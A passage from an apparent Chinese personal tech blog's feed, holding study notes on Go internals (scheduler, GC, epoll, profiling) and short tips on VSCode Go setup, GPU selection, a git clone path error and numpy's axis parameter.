id="G的状态转换图"><a href="#G的状态转换图" class="headerlink" title="G的状态转换图"></a>G的状态转换图</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/93.png"></p><h4 id="G所处的位置"><a href="#G所处的位置" class="headerlink" title="G所处的位置"></a>G所处的位置</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/94.png"></p><h4 id="Goroutine创建过程"><a href="#Goroutine创建过程" class="headerlink" title="Goroutine创建过程"></a>Goroutine创建过程</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/95.png"></p><h4 id="将-Goroutine-放到运行队列上"><a href="#将-Goroutine-放到运行队列上" class="headerlink" title="将 Goroutine 放到运行队列上"></a>将 Goroutine 放到运行队列上</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/96.png"></p><h4 id="调度器行为"><a href="#调度器行为" class="headerlink" title="调度器行为"></a>调度器行为</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/97.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>线程和进程来比较的话线城市更轻量的，切换线程不用切换那些内存空间，线程的调度本身还是需要系统调用的，系统调用本身是涉及到内核态到用户态的切换的，会有开销，goroutine主要就是为了减少这种开销，P让每个G都能有机会运行一下，另外，M（也就是内核线程）的数量大于P，这样做的目的是M可能陷入系统调用，而系统调用可能是阻塞的，比如磁盘读取，这个时候CPU是空闲的，创建新的M并与P关联，可以让更多的G被调度，充分利用CPU。</p><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><h4 id="堆内存管理"><a href="#堆内存管理" class="headerlink" title="堆内存管理"></a>堆内存管理</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/98.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/99.png"></p><h4 id="堆内存管理的挑战"><a href="#堆内存管理的挑战" class="headerlink" title="堆内存管理的挑战"></a>堆内存管理的挑战</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/100.png"></p><h4 id="ThreadCacheMalloc概览"><a href="#ThreadCacheMalloc概览" class="headerlink" title="ThreadCacheMalloc概览"></a>ThreadCacheMalloc概览</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/101.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/102.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/103.png"></p><h4 id="Go语言内存分配"><a href="#Go语言内存分配" class="headerlink" title="Go语言内存分配"></a>Go语言内存分配</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/104.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/105.png"></p><h4 id="内存回收"><a href="#内存回收" class="headerlink" title="内存回收"></a>内存回收</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/106.png"></p><h4 id="mspan"><a href="#mspan" class="headerlink" title="mspan"></a>mspan</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/107.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/108.png"></p><h4 id="GC工作流程"><a href="#GC工作流程" class="headerlink" title="GC工作流程"></a>GC工作流程</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/109.png"></p><h5 id="三色标记"><a href="#三色标记" class="headerlink" title="三色标记"></a>三色标记</h5><p>灰色就是先给他标记一下，还没有进行判断活不活跃，灰色标记完成然后把锁给解掉，用户态的就可以执行了。<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/110.png"><br>一个函数中第一个对象指针就是根对象，全局的指针也是根对象，如果只是定义了一个没指针的（比如struct）这个对象和栈绑定，函数退出这个对象的生命周期也就结束了，所以gc只是对堆的一个扫描。<br>扫对象，能扫到的最后都被标记成黑色了，<br>黑色对象就意味着他是活跃的，他就不会被回收，凡是没有被根对象引用的他就会被回收掉。<br>扫不到的就是白的。</p><h4 id="垃圾回收触发机制"><a href="#垃圾回收触发机制" class="headerlink" title="垃圾回收触发机制"></a>垃圾回收触发机制</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/111.png"></p><h3 id="包引用与依赖管理"><a href="#包引用与依赖管理" class="headerlink" title="包引用与依赖管理"></a>包引用与依赖管理</h3><h4 id="Go语言依赖管理的演进"><a href="#Go语言依赖管理的演进" class="headerlink" title="Go语言依赖管理的演进"></a>Go语言依赖管理的演进</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/112.png"></p><h4 id="vendor管理工具"><a href="#vendor管理工具" class="headerlink" title="vendor管理工具"></a>vendor管理工具</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/113.png"></p><h4 id="Go-mod使用"><a href="#Go-mod使用" class="headerlink" title="Go mod使用"></a>Go mod使用</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/114.png"></p><h5 id="sample"><a href="#sample" class="headerlink" title="sample"></a>sample</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/115.png"></p><h4 id="GOPROXY-和-GOPRIVATE"><a href="#GOPROXY-和-GOPRIVATE" class="headerlink" title="GOPROXY 和 GOPRIVATE"></a>GOPROXY 和 GOPRIVATE</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/116.png"></p><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><h5 id="Go-语言项目多采用-Makefile-组织项目编译"><a href="#Go-语言项目多采用-Makefile-组织项目编译" class="headerlink" title="Go 语言项目多采用 Makefile 组织项目编译"></a>Go 语言项目多采用 Makefile 组织项目编译</h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> tag=v1.0</span><br><span class="line"></span><br><span class="line"><span class="section">root:</span></span><br><span class="line">    <span class="keyword">export</span> ROOT=github.com/cncamp/golang</span><br><span class="line"></span><br><span class="line"><span class="section">build:</span></span><br><span class="line">    echo <span class="string">&quot;building httpserver binary&quot;</span></span><br><span class="line">    mkdir -p bin/amd64</span><br><span class="line">    //输出放到-o bin/amd64 .</span><br><span class="line">    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o bin/amd64 .</span><br><span class="line">//打包docker</span><br><span class="line"><span class="section">release: build</span></span><br><span class="line">    echo <span class="string">&quot;building httpserver container&quot;</span></span><br><span class="line">    docker build -t cncamp/httpserver:$&#123;tag&#125; .</span><br><span class="line"></span><br><span class="line"><span class="section">push: release</span></span><br><span class="line">    echo <span class="string">&quot;pushing cncamp/httpserver&quot;</span></span><br><span class="line">docker push cncamp/httpserver:v1.0</span><br></pre></td></tr></table></figure><h3 id="动手编写一个HTTP-Server"><a href="#动手编写一个HTTP-Server" class="headerlink" title="动手编写一个HTTP Server"></a>动手编写一个HTTP Server</h3><h4 id="理解网络协议层"><a href="#理解网络协议层" class="headerlink" title="理解网络协议层"></a>理解网络协议层</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/117.png"></p><h4 id="理解Socket"><a href="#理解Socket" class="headerlink" title="理解Socket"></a>理解Socket</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/118.png"><br>所以说一个链接里有两个socket，链接五元组：源ip源端口目标ip目标端口+协议。</p><h4 id="理解-net-http-包"><a href="#理解-net-http-包" class="headerlink" title="理解 net.http 包"></a>理解 net.http 包</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/119.png"></p><h4 id="阻塞IO模型"><a href="#阻塞IO模型" class="headerlink" title="阻塞IO模型"></a>阻塞IO模型</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/120.png"></p><h4 id="非阻塞IO-模型"><a href="#非阻塞IO-模型" class="headerlink" title="非阻塞IO 模型"></a>非阻塞IO 模型</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/121.png"></p><h4 id="IO-多路复用"><a href="#IO-多路复用" class="headerlink" title="IO 多路复用"></a>IO 多路复用</h4><p>获得一个FD列表，相当于一个单线程去问系统内核哪一个线程就绪了，而不是每一个线程自己去问，缺点是列表长度有限，最多1024<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/122.png"></p><h4 id="异步-IO"><a href="#异步-IO" class="headerlink" title="异步 IO"></a>异步 IO</h4><p>返回之后这个系统调用直接结束，等数据从socketbufffer到内存都准备好了再从内核给应用发信号。<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/123.png"></p><h4 id="IO多路复用中的epoll"><a href="#IO多路复用中的epoll" class="headerlink" title="IO多路复用中的epoll"></a>IO多路复用中的epoll</h4><p>解决了上面多路复用的问题</p><ul><li>用户态和kernel共享一块内存</li></ul><p>其中rbr是红黑树<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/124.png"></p><h4 id="Go-语言高性能-httpserver-的实现细节"><a href="#Go-语言高性能-httpserver-的实现细节" class="headerlink" title="Go 语言高性能 httpserver 的实现细节"></a>Go 语言高性能 httpserver 的实现细节</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/125.png"></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h4 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/126.png"></p><h5 id="dlv的配置"><a href="#dlv的配置" class="headerlink" title="dlv的配置"></a>dlv的配置</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/127.png"></p><h4 id="更多debug方法"><a href="#更多debug方法" class="headerlink" title="更多debug方法"></a>更多debug方法</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/128.png"></p><h4 id="glog使用方法示例"><a href="#glog使用方法示例" class="headerlink" title="glog使用方法示例"></a>glog使用方法示例</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/129.png"></p><h4 id="性能分析-Performance-Profiling"><a href="#性能分析-Performance-Profiling" class="headerlink" title="性能分析( Performance Profiling)"></a>性能分析( Performance Profiling)</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/130.png"></p><h5 id="分析CPU瓶颈"><a href="#分析CPU瓶颈" class="headerlink" title="分析CPU瓶颈"></a>分析CPU瓶颈</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/131.png"></p><h5 id="其他可用-profiling-工具分析的问题"><a href="#其他可用-profiling-工具分析的问题" class="headerlink" title="其他可用 profiling 工具分析的问题"></a>其他可用 profiling 工具分析的问题</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/132.png"></p><h5 id="针对http服务的-pprof"><a href="#针对http服务的-pprof" class="headerlink" title="针对http服务的 pprof"></a>针对http服务的 pprof</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/133.png"></p><h5 id="分析go-profiling-结果"><a href="#分析go-profiling-结果" class="headerlink" title="分析go profiling 结果"></a>分析go profiling 结果</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/134.png"></p><h5 id="结果分析示例"><a href="#结果分析示例" class="headerlink" title="结果分析示例"></a>结果分析示例</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/135.png"></p><h3 id="Kubernetes-中常用代码解读"><a href="#Kubernetes-中常用代码解读" class="headerlink" title="Kubernetes 中常用代码解读"></a>Kubernetes 中常用代码解读</h3><h4 id="Rate-Limit-Queue"><a href="#Rate-Limit-Queue" class="headerlink" title="Rate Limit Queue"></a>Rate Limit Queue</h4><p>出现问题控制器等待时间呈指数增长，最长5分钟<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/136.png"></p><h3 id="Kubernetes-日常运维中的代码调试场景"><a href="#Kubernetes-日常运维中的代码调试场景" class="headerlink" title="Kubernetes 日常运维中的代码调试场景"></a>Kubernetes 日常运维中的代码调试场景</h3><h4 id="案例1：空指针"><a href="#案例1：空指针" class="headerlink" title="案例1：空指针"></a>案例1：空指针</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/137.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/138.png"></p><h4 id="案例2：-Map-的读写冲突"><a href="#案例2：-Map-的读写冲突" class="headerlink" title="案例2： Map 的读写冲突"></a>案例2： Map 的读写冲突</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/139.png"></p><h4 id="案例3：-kube-proxy-消耗-10个-CPU"><a href="#案例3：-kube-proxy-消耗-10个-CPU" class="headerlink" title="案例3： kube-proxy 消耗 10个 CPU"></a>案例3： kube-proxy 消耗 10个 CPU</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/140.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/141.png"></p><h4 id="案例4：线程池耗尽"><a href="#案例4：线程池耗尽" class="headerlink" title="案例4：线程池耗尽"></a>案例4：线程池耗尽</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/142.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vscode上配置Go-Mac版本</title>
      <link href="/2022/03/11/Vscode%E4%B8%8A%E9%85%8D%E7%BD%AEGo-Mac%E7%89%88%E6%9C%AC/"/>
      <url>/2022/03/11/Vscode%E4%B8%8A%E9%85%8D%E7%BD%AEGo-Mac%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="安装go"><a href="#安装go" class="headerlink" title="安装go"></a>安装go</h2><ol><li><p>在<a href="https://go.dev/dl/">https://go.dev/dl/</a>下载</p></li><li><p>下载pkg后自动配置GOROOT</p></li><li><p>使用<code>go env</code>可以查看配置的go环境变量</p></li><li><p>配置GOPATH以及其下的src，pkg，bin目录</p><h2 id="配置vscode"><a href="#配置vscode" class="headerlink" title="配置vscode"></a>配置vscode</h2></li><li><p>vscode安装go，coderunner</p></li><li><p>setting.json中配置如下内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;files.autoSave&quot;</span>: <span class="string">&quot;onFocusChange&quot;</span>,</span><br><span class="line">       <span class="string">&quot;go.useLanguageServer&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="string">&quot;go.buildOnSave&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;go.lintOnSave&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;go.vetOnSave&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;go.buildFlags&quot;</span>: [],</span><br><span class="line">       <span class="string">&quot;go.lintFlags&quot;</span>: [],</span><br><span class="line">       <span class="string">&quot;go.vetFlags&quot;</span>: [],</span><br><span class="line">       <span class="string">&quot;go.coverOnSave&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">&quot;go.useCodeSnippetsOnFunctionSuggest&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">&quot;go.formatOnSave&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;go.formatTool&quot;</span>: <span class="string">&quot;goreturns&quot;</span>,</span><br><span class="line">       <span class="string">&quot;go.goroot&quot;</span>: <span class="string">&quot;/usr/local/go&quot;</span>,<span class="comment">// 你的Goroot</span></span><br><span class="line">       <span class="string">&quot;go.gopath&quot;</span>: <span class="string">&quot;/Users/sketchzero/go&quot;</span>,<span class="comment">// 你的Gopath</span></span><br><span class="line"></span><br><span class="line">          </span><br><span class="line">       <span class="string">&quot;code-runner.runInTerminal&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;code-runner.ignoreSelection&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;code-runner.saveAllFilesBeforeRun&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">       <span class="string">&quot;code-runner.executorMap&quot;</span>: &#123;</span><br><span class="line">           <span class="attr">&quot;python&quot;</span>: <span class="string">&quot;python3 -u&quot;</span>,</span><br><span class="line">           <span class="attr">&quot;go&quot;</span>: <span class="string">&quot;go run&quot;</span>,</span><br><span class="line">           <span class="attr">&quot;c&quot;</span>: <span class="string">&quot;cd $dir &amp;&amp; gcc $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;</span>,</span><br><span class="line">           <span class="attr">&quot;cpp&quot;</span>: <span class="string">&quot;cd $dir &amp;&amp; g++ -std=c++11 $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;</span>,</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> devops </tag>
            
            <tag> sre </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GPU操作指南</title>
      <link href="/2022/03/08/GPU%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/"/>
      <url>/2022/03/08/GPU%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h2 id="跑代码的时候指定一块显卡跑"><a href="#跑代码的时候指定一块显卡跑" class="headerlink" title="跑代码的时候指定一块显卡跑"></a>跑代码的时候指定一块显卡跑</h2><p>#按照PCI_BUS_ID顺序从0开始排列GPU设备<br>os.environ[“CUDA_DEVICE_ORDER”]=”PCI_BUS_ID”</p><p>#设置当前使用的GPU设备仅为0号设备 设备名称为’/gpu:0’<br>os.environ[“CUDA_VISIBLE_DEVICES”]=”0”</p><p>#设置当前使用的GPU设备为0,1号两个设备,名称依次为’/gpu:0’、’/gpu:1’<br>os.environ[“CUDA_VISIBLE_DEVICES”]=”0,1”</p><p>#设置当前使用的GPU设备为1,0号两个设备,名称依次为’/gpu:0’、’/gpu:1’<br>#并且优先使用1号设备,然后使用0号设备<br>os.environ[“CUDA_VISIBLE_DEVICES”]=”1,0”</p><p>#一般写在文件最开头的位置<br><img src="http://106.12.125.218/medias/medias/GPU%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/0.png"></p><h2 id="查看当前gpu使用情况"><a href="#查看当前gpu使用情况" class="headerlink" title="查看当前gpu使用情况"></a>查看当前gpu使用情况</h2><p>watch -n 1 nvidia-smi<br>gpustat -cpu –color</p><h3 id="解决gpu没有运行进程，但是显存一直占用的方式"><a href="#解决gpu没有运行进程，但是显存一直占用的方式" class="headerlink" title="解决gpu没有运行进程，但是显存一直占用的方式"></a><a href="https://www.cnblogs.com/cofludy/p/13971371.html">解决gpu没有运行进程，但是显存一直占用的方式</a></h3><p>fuser -v /dev/nvidia*<br>kill 7655</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gpu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-clone时报错</title>
      <link href="/2022/03/04/Git-clone%E6%97%B6%E6%8A%A5%E9%94%99/"/>
      <url>/2022/03/04/Git-clone%E6%97%B6%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<p>error: invalid path ‘Icon?’fatal: unable to checkout working tree warning: Clone succeeded, but checkout failed.<br>错因：windows下不能有’Icon?’这种命名，把？去掉就行了</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>numpy的n维矩阵np.sum()中参数axis的理解</title>
      <link href="/2022/03/04/numpy%E7%9A%84n%E7%BB%B4%E7%9F%A9%E9%98%B5np.sum()%E4%B8%AD%E5%8F%82%E6%95%B0axis%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2022/03/04/numpy%E7%9A%84n%E7%BB%B4%E7%9F%A9%E9%98%B5np.sum()%E4%B8%AD%E5%8F%82%E6%95%B0axis%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>个人看来，numpy的高维矩阵，是基于一维向量和二维数组就可以进行理解的，也就是说每次把元素拓展成一个向量，就可以多出一个维度，n为偶数时，只不过是二维数组套二维数组，类似套娃的形式即可理解。<br>其索引是由外向内的，本质还是列表嵌套的形式的，比如一个三维矩阵:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange(<span class="number">12</span>).reshape((<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>],</span><br><span class="line">        [ <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>],</span><br><span class="line">        [ <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]]])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再说下参数axis的含义。书上和很多人的理解是直接告诉你axis＝0是跨行，axis＝1是跨列。我一直觉得这种理解稍显呆板。实际上从索引出发，就明白了，在np.sum()函数里参数axis的值表示的是第几个索引下的元素去整合，那axis＝2就表示其他索引不变，第3个索引处的值全部相加。<br> a[i,j] 就对应axis＝0，也就是大家说的，列号不动，把对应的行全加起来，得到一个新向量 b 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>],</span><br><span class="line">        [ <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>],</span><br><span class="line">        [ <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.<span class="built_in">sum</span>(a,axis=<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">6</span>,  <span class="number">8</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="number">0</span>,<span class="number">2</span>] == a[<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>]+a[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>axis＝(2,3)，四维数组，在保证一二维不改变的情况下，将第三第四维的都加起来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange(<span class="number">24</span>).reshape((<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[[ <span class="number">0</span>,  <span class="number">1</span>],</span><br><span class="line">         [ <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">         [ <span class="number">4</span>,  <span class="number">5</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">         [ <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">         [<span class="number">10</span>, <span class="number">11</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       [[[<span class="number">12</span>, <span class="number">13</span>],</span><br><span class="line">         [<span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">         [<span class="number">16</span>, <span class="number">17</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">         [<span class="number">20</span>, <span class="number">21</span>],</span><br><span class="line">         [<span class="number">22</span>, <span class="number">23</span>]]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">sum</span>(a,axis=(<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line">array([[ <span class="number">15</span>,  <span class="number">51</span>],</span><br><span class="line">       [ <span class="number">87</span>, <span class="number">123</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">sum</span>(a,axis=(-<span class="number">1</span>,-<span class="number">2</span>))</span><br><span class="line">array([[ <span class="number">15</span>,  <span class="number">51</span>],</span><br><span class="line">       [ <span class="number">87</span>, <span class="number">123</span>]])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> numpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是七天年化收益率和年利率</title>
      <link href="/2022/03/02/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%83%E5%A4%A9%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87%E5%92%8C%E5%B9%B4%E5%88%A9%E7%8E%87/"/>
